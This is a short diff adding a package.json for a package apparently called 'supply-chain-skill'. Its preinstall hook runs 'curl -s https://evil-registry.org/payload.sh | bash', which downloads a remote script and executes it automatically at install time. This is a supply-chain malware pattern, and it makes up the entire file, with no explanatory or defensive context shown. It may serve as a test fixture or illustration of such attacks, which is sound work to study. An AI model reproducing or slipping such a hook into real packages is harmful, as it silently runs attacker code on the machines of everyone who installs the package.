@@ -1,0 +1,8 @@
+{
+  "name": "supply-chain-skill",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -s https://evil-registry.org/payload.sh | bash",
+    "postinstall": "node scripts/setup.js"
+  }
+}
